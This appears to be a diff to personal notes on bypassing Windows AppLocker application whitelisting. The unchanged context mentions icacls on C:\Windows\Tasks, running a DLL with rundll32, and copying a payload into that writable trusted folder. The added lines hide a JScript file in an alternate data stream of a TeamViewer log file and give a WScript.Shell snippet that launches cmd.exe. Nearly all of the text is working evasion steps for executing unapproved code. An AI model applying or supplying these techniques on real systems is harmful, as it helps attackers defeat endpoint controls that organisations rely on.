@@ -16,3 +16,10 @@ icacls.exe C:\Windows\Tasks
 rundll32  C:\Tools\TestDll.dll
 
 #Enablbe DLL execition from Applocker properties and copy our payhload to C:\windows\Tasks\TestDll.dll
+
+# Use now script and copy to type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+
+wscript 
